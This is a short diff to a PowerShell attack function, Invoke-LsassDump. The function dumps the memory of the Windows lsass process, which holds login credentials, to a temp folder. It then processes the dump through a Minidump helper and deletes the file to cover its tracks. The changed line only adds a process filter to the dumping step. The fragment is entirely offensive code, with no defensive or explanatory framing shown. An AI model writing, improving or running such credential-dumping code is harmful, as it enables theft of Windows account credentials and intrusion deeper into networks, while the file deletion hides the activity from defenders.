@@ -21,7 +21,7 @@ Function Invoke-LsassDump {
         return
     }
 
-    $dumpPath = Get-Process -Name lsass | Out-SnapDump -DumpFilePath "C:\Windows\Temp"
+    $dumpPath = Get-Process -Name lsass | Where-Object {$_.Handles} | Out-SnapDump -DumpFilePath "C:\Windows\Temp"
     [Minidump.Program]::BuckleUp($dumpPath)
     Remove-Item -Path $dumpPath -ErrorAction SilentlyContinue
 }
